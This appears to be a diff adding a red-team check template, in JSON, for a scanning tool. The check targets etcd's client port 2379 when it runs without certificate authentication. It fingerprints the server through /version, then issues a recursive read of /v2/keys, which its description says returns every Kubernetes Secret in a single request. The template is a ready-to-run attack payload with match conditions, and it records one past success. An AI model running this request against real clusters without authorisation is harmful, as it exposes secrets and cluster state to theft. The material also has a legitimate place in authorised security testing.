@@ -1,0 +1,35 @@
+{
+  "name": "redteam/etcd unauth key-value read",
+  "description": "[adv] etcd client port 2379 without client-cert auth (CWE-306; PentestPad port 2379, hackviser): /version fingerprints, /v2/keys lists the Kubernetes backing store — every Secret, base64, in one request. Keywords: etcd 2379 kubernetes secrets key-value noauth cluster state. ctrl: cert-auth cluster 403s -> not falsified. base_url = host root (skill targets :2379).",
+  "cwe": "CWE-306",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}:2379/v2/keys?recursive=true"
+    },
+    "probe": {
+      "method": "GET",
+      "url": "{{base_url}}:2379/version"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "probe",
+      "pattern": "\"etcdserver\""
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\"node\"|\"kvs\"|\"value\""
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "2cf43e04659d",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
